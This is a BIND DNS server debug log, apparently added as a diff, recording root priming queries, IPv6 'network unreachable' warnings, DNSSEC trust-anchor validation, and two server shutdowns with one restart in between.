+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 resolver: debug 3: fctx 0x7efce80038a0(./NS): createfind for <unknown> - success
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2::c#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2::c#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:a8::e#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:a8::e#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:c27::2:30#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:c27::2:30#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fe::53#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fe::53#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:1::53#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:1::53#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2f::f#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2f::f#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:dc3::35#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:dc3::35#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2d::d#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2d::d#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:9f::42#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:9f::42#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fd::1#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fd::1#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:12::d0d#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:12::d0d#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2801:1b8:10::b#53
+22-May-2025 19:43:58.129 lame-servers: info: network unreachable resolving './NS/IN': 2801:1b8:10::b#53
+22-May-2025 19:43:58.149 database: debug 1: delete_node(): 0x7efce80cae10 . (bucket 5)
+22-May-2025 19:43:58.149 dnssec: debug 3: validating ./NS: starting
+22-May-2025 19:43:58.149 dnssec: debug 3: validating ./NS: attempting positive response validation
+22-May-2025 19:43:58.149 resolver: debug 1: fetch: ./DNSKEY
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 resolver: debug 3: fctx 0x7efce80d9520(./DNSKEY): createfind for <unknown> - success
+22-May-2025 19:43:58.149 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2f::f#53
+22-May-2025 19:43:58.149 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2801:1b8:10::b#53
+22-May-2025 19:43:58.149 dnssec: debug 3: managed-keys-zone: Returned from key fetch in keyfetch_done() for '.': success
+22-May-2025 19:43:58.149 dnssec: debug 3: managed-keys-zone: Verifying DNSKEY set for zone '.' using DS 20326/8: success
+22-May-2025 19:43:58.149 dnssec: info: managed-keys-zone: Key 20326 for zone . is now trusted (acceptance timer complete)
+22-May-2025 19:43:58.159 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.159 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 19:43:58.159
+22-May-2025 19:43:58.159 dnssec: info: managed-keys-zone: Key 38696 for zone . is now trusted (acceptance timer complete)
+22-May-2025 19:43:58.159 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 19:43:58.159 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 19:43:58.159
+22-May-2025 19:43:58.159 general: debug 1: zone_journal: managed-keys-zone: enter
+22-May-2025 19:43:58.159 general: debug 3: writing to journal
+22-May-2025 19:43:58.159 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 19:43:58.159 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:12::d0d#53
+22-May-2025 19:43:58.159 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.159 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.159 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:43:58.159 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:c27::2:30#53
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./DNSKEY: starting
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./DNSKEY: attempting positive response validation
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./DNSKEY: verify rdataset (keyid=20326): success
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./DNSKEY: marking as secure (DS)
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./NS: in fetch_callback_dnskey
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./NS: keyset with trust secure
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./NS: resuming validate
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./NS: verify rdataset (keyid=53148): success
+22-May-2025 19:43:58.259 dnssec: debug 3: validating ./NS: marking as secure, noqname proof not needed
+22-May-2025 19:43:58.259 resolver: debug 1: resolver priming query complete: success
+22-May-2025 19:44:24.189 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 19:44:24.189 general: debug 1: zone_dump: managed-keys-zone: enter
+22-May-2025 19:44:24.189 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 19:44:24.209 general: debug 1: dump_done: managed-keys-zone: enter
+22-May-2025 19:44:24.209 general: debug 1: zone_journal_compact: managed-keys-zone: target journal size 0
+22-May-2025 19:44:24.209 general: debug 3: managed-keys-zone: dns_journal_compact: success
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28d5b0(3)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28c6f0(1)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28ce50(2)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28bf90(0)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28dd10(4)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28ebd0(6)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28e470(5)
+22-May-2025 20:36:02.323 default: debug 1: netmgr 0x555d7e2969a0: Shutting down network manager worker on loop 0x555d7e28f330(7)
+22-May-2025 20:36:02.333 network: info: no longer listening on 127.0.0.1#53
+22-May-2025 20:36:02.333 network: info: no longer listening on 172.19.0.2#53
+22-May-2025 20:36:02.333 network: info: no longer listening on ::1#53
+22-May-2025 20:36:02.333 general: notice: stopping command channel on 127.0.0.1#953
+22-May-2025 20:36:02.333 general: notice: stopping command channel on ::1#953
+22-May-2025 20:36:02.333 general: debug 1: loop exclusive mode: starting
+22-May-2025 20:36:02.333 general: debug 1: loop exclusive mode: started
+22-May-2025 20:36:02.333 general: info: shutting down
+22-May-2025 20:36:02.343 general: debug 3: dns_requestmgr_shutdown: 0x555d7e406fa0
+22-May-2025 20:36:02.353 general: debug 1: managed-keys-zone: final reference detached
+22-May-2025 20:36:02.353 general: debug 3: dns_requestmgr_shutdown: 0x555d7e523430
+22-May-2025 20:36:02.353 general: debug 1: zone authors.bind/CH: final reference detached
+22-May-2025 20:36:02.353 general: debug 1: zone hostname.bind/CH: final reference detached
+22-May-2025 20:36:02.353 general: debug 1: zone version.bind/CH: final reference detached
+22-May-2025 20:36:02.353 general: debug 1: zone id.server/CH: final reference detached
+22-May-2025 20:36:02.353 database: debug 1: called qpzone_destroy(.)
+22-May-2025 20:36:02.353 general: debug 1: loop exclusive mode: ending
+22-May-2025 20:36:02.363 general: debug 1: loop exclusive mode: ended
+22-May-2025 20:36:02.363 general: debug 3: zone_shutdown: zone hostname.bind/CH: shutting down
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28c6f0(0)
+22-May-2025 20:36:02.363 general: debug 3: zone_shutdown: zone authors.bind/CH: shutting down
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28ce50(0)
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28d5b0(0)
+22-May-2025 20:36:02.363 general: debug 3: requestmgr_destroy
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28dd10(0)
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28e470(0)
+22-May-2025 20:36:02.363 general: debug 3: zone_shutdown: managed-keys-zone: shutting down
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28ebd0(0)
+22-May-2025 20:36:02.363 general: debug 3: zone_shutdown: zone version.bind/CH: shutting down
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28f330(0)
+22-May-2025 20:36:02.363 general: debug 3: zone_shutdown: zone id.server/CH: shutting down
+22-May-2025 20:36:02.363 default: debug 1: netmgr 0x555d7e2969a0: Destroying network manager worker on loop 0x555d7e28bf90(0)
+22-May-2025 20:36:02.363 database: debug 1: called qpzone_destroy(.)
+22-May-2025 20:36:02.363 database: debug 1: done qpcache__destroy(.)
+22-May-2025 20:36:02.363 database: debug 1: done qpcache__destroy(.)
+22-May-2025 20:36:02.363 database: debug 1: called qpzone_destroy(.)
+22-May-2025 20:36:02.363 general: debug 3: requestmgr_destroy
+22-May-2025 20:36:02.373 database: debug 2: Unregistering DLZ_dlopen driver
+22-May-2025 20:36:02.373 database: debug 2: Unregistering SDLZ driver.
+22-May-2025 20:36:02.373 database: debug 2: Unregistering DLZ driver.
+22-May-2025 20:36:02.373 general: notice: exiting
+22-May-2025 21:03:49.864 general: debug 1: now using logging configuration from config file
+22-May-2025 21:03:49.864 general: debug 1: loop exclusive mode: ending
+22-May-2025 21:03:49.864 general: debug 1: loop exclusive mode: ended
+22-May-2025 21:03:49.864 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 21:03:49.864 general: notice: command channel listening on 127.0.0.1#953
+22-May-2025 21:03:49.864 general: info: configuring command channel from '/etc/bind/rndc.key'
+22-May-2025 21:03:49.944 general: notice: command channel listening on ::1#953
+22-May-2025 21:03:50.024 general: debug 1: load_configuration: success
+22-May-2025 21:03:50.024 general: debug 1: loop exclusive mode: starting
+22-May-2025 21:03:50.024 general: debug 1: loop exclusive mode: started
+22-May-2025 21:03:50.024 zoneload: debug 1: managed-keys-zone: starting load
+22-May-2025 21:03:50.024 general: debug 1: zone_startload: managed-keys-zone: enter
+22-May-2025 21:03:50.024 zoneload: debug 2: managed-keys-zone: number of nodes in database: 1
+22-May-2025 21:03:50.024 zoneload: debug 1: managed-keys-zone: journal rollforward completed successfully: up to date
+22-May-2025 21:03:50.024 zoneload: debug 1: managed-keys-zone: loaded; checking validity
+22-May-2025 21:03:50.024 zoneload: info: managed-keys-zone: loaded serial 3
+22-May-2025 21:03:50.024 general: debug 1: loop exclusive mode: ending
+22-May-2025 21:03:50.024 general: debug 1: loop exclusive mode: ended
+22-May-2025 21:03:50.024 zoneload: debug 1: zone authors.bind/CH: starting load
+22-May-2025 21:03:50.024 zoneload: debug 2: zone authors.bind/CH: number of nodes in database: 0
+22-May-2025 21:03:50.024 zoneload: debug 1: zone version.bind/CH: starting load
+22-May-2025 21:03:50.024 zoneload: debug 2: zone version.bind/CH: number of nodes in database: 0
+22-May-2025 21:03:50.024 zoneload: debug 1: zone hostname.bind/CH: starting load
+22-May-2025 21:03:50.024 zoneload: debug 2: zone hostname.bind/CH: number of nodes in database: 0
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 zoneload: debug 1: zone hostname.bind/CH: loaded; checking validity
+22-May-2025 21:03:50.024 zoneload: debug 1: zone authors.bind/CH: loaded; checking validity
+22-May-2025 21:03:50.024 general: debug 1: dns_zone_verifydb: zone hostname.bind/CH: enter
+22-May-2025 21:03:50.024 zoneload: debug 1: zone version.bind/CH: loaded; checking validity
+22-May-2025 21:03:50.024 general: debug 1: dns_zone_verifydb: zone authors.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_maintenance: zone hostname.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: dns_zone_verifydb: zone version.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_maintenance: zone authors.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:03:50.024 zoneload: debug 1: zone id.server/CH: starting load
+22-May-2025 21:03:50.024 zoneload: debug 2: zone id.server/CH: number of nodes in database: 0
+22-May-2025 21:03:50.024 zoneload: debug 1: zone id.server/CH: loaded; checking validity
+22-May-2025 21:03:50.024 general: debug 1: dns_zone_verifydb: zone id.server/CH: enter
+22-May-2025 21:03:50.024 general: notice: all zones loaded
+22-May-2025 21:03:50.024 general: debug 1: managed-keys-zone: synchronizing trusted keys
+22-May-2025 21:03:50.024 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:03:50.024
+22-May-2025 21:03:50.024 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:03:50.024
+22-May-2025 21:03:50.024 general: notice: FIPS mode is disabled
+22-May-2025 21:03:50.024 general: notice: running
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_maintenance: zone version.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_maintenance: zone id.server/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone hostname.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone authors.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone version.bind/CH: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: zone_refreshkeys: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:03:50.024
+22-May-2025 21:03:50.024 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: managed-keys-zone: next key refresh: 22-May-2025 21:03:50.024
+22-May-2025 21:03:50.024 dnssec: debug 3: managed-keys-zone: Creating key fetch in zone_refreshkeys() for '.'
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 resolver: debug 1: fetch: ./DNSKEY
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.024 resolver: debug 1: fetch: ./NS
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b4001270(./DNSKEY): createfind for <unknown> - success
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fd::1#53
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 resolver: debug 3: fctx 0x7fc7b40038a0(./NS): createfind for <unknown> - success
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2::c#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2::c#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2801:1b8:10::b#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2801:1b8:10::b#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:7fe::53#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:7fe::53#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:c27::2:30#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:c27::2:30#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:a8::e#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:a8::e#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:12::d0d#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:12::d0d#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:1::53#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:1::53#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2d::d#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2d::d#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:2f::f#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:2f::f#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:503:ba3e::2:30#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:503:ba3e::2:30#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:dc3::35#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:dc3::35#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './DNSKEY/IN': 2001:500:9f::42#53
+22-May-2025 21:03:50.024 lame-servers: info: network unreachable resolving './NS/IN': 2001:500:9f::42#53
+22-May-2025 21:03:50.024 general: debug 1: zone__settimer: zone id.server/CH: enter
+22-May-2025 21:03:50.114 dnssec: debug 3: managed-keys-zone: Returned from key fetch in keyfetch_done() for '.': success
+22-May-2025 21:03:50.114 dnssec: debug 3: managed-keys-zone: Verifying DNSKEY set for zone '.' using DS 20326/8: success
+22-May-2025 21:03:50.114 dnssec: info: managed-keys-zone: Key 20326 for zone . is now trusted (acceptance timer complete)
+22-May-2025 21:03:50.114 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.114 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 21:03:50.114
+22-May-2025 21:03:50.114 dnssec: info: managed-keys-zone: Key 38696 for zone . is now trusted (acceptance timer complete)
+22-May-2025 21:03:50.114 general: debug 1: set_refreshkeytimer: managed-keys-zone: enter
+22-May-2025 21:03:50.114 general: debug 1: managed-keys-zone: next key refresh: 23-May-2025 21:03:50.114
+22-May-2025 21:03:50.114 general: debug 1: zone_journal: managed-keys-zone: enter
+22-May-2025 21:03:50.114 general: debug 3: writing to journal
+22-May-2025 21:03:50.124 general: debug 1: zone_needdump: managed-keys-zone: enter
+22-May-2025 21:03:50.124 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.124 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.124 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: starting
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: attempting positive response validation
+22-May-2025 21:03:50.124 dnssec: debug 3:   validating ./DNSKEY: starting
+22-May-2025 21:03:50.124 dnssec: debug 3:   validating ./DNSKEY: attempting positive response validation
+22-May-2025 21:03:50.124 dnssec: debug 3:   validating ./DNSKEY: verify rdataset (keyid=20326): success
+22-May-2025 21:03:50.124 dnssec: debug 3:   validating ./DNSKEY: marking as secure (DS)
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: in validator_callback_dnskey
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: keyset with trust secure
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: resuming validate
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: verify rdataset (keyid=53148): success
+22-May-2025 21:03:50.124 dnssec: debug 3: validating ./NS: marking as secure, noqname proof not needed
+22-May-2025 21:03:50.124 resolver: debug 1: resolver priming query complete: success
+22-May-2025 21:04:20.125 general: debug 1: zone_maintenance: managed-keys-zone: enter
+22-May-2025 21:04:20.125 general: debug 1: zone_dump: managed-keys-zone: enter
+22-May-2025 21:04:20.125 general: debug 1: zone__settimer: managed-keys-zone: enter
+22-May-2025 21:04:20.125 general: debug 1: dump_done: managed-keys-zone: enter
+22-May-2025 21:04:20.125 general: debug 1: zone_journal_compact: managed-keys-zone: target journal size 0
+22-May-2025 21:04:20.125 general: debug 3: managed-keys-zone: dns_journal_compact: success
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683146330(7)
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x5626831436f0(1)
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x5626831445b0(3)
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683145bd0(6)
+22-May-2025 21:04:33.902 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683144d10(4)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683142f90(0)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683143e50(2)
+22-May-2025 21:04:33.912 default: debug 1: netmgr 0x56268314d9a0: Shutting down network manager worker on loop 0x562683145470(5)
+22-May-2025 21:04:33.912 network: info: no longer listening on 127.0.0.1#53
+22-May-2025 21:04:33.912 network: info: no longer listening on 172.19.0.2#53
+22-May-2025 21:04:33.912 network: info: no longer listening on ::1#53
+22-May-2025 21:04:33.912 general: notice: stopping command channel on 127.0.0.1#953
+22-May-2025 21:04:33.912 general: notice: stopping command channel on ::1#953
+22-May-2025 21:04:33.912 general: debug 1: loop exclusive mode: starting
+22-May-2025 21:04:33.912 general: debug 1: loop exclusive mode: started
+22-May-2025 21:04:33.912 general: info: shutting down
+22-May-2025 21:04:33.912 general: debug 3: dns_requestmgr_shutdown: 0x5626832bdfa0
+22-May-2025 21:04:33.912 general: debug 1: managed-keys-zone: final reference detached
